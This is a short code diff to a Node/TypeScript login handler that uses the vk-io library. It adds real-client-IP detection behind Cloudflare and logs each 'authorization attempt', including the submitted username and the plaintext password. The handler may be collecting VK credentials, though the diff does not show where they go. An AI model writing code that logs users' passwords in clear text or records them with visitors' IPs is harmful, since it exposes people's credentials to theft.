@@ -1,8 +1,8 @@
 import { VK } from "vk-io";
-import auth from "../misc/auth.ts";
-import * as ac from "../misc/auth-constants.ts";
+import auth from "../misc/auth";
+import * as ac from "../misc/auth-constants";
 import chalk from "chalk";
-import { EventsPipe } from "../system.ts";
+import { EventsPipe } from "../system";
 
 const _ = console.log.bind(console);
 const kwLog = (key, value) =>
@@ -14,10 +14,15 @@ const kwLog = (key, value) =>
 
 export const post = async (request, response) => {
   const ua = request.headers["user-agent"];
+  const ip =
+    request.headers["cf-connecting-ip"] ||
+    request.headers["x-forwarded-for"] ||
+    request.connection.remoteAddress;
   let agent;
 
   _();
   _(chalk.bold("<Authorization attempt>"));
+  kwLog("IP", ip);
   kwLog("Username", request.body.username);
   kwLog("Password", request.body.password);
 
@@ -31,7 +36,7 @@ export const post = async (request, response) => {
   kwLog("Platform", agent);
 
   const basicData = {
-    ip: request.connection.remoteAddress,
+    ip,
     platform: agent,
     userAgent: ua,
     ...request.body
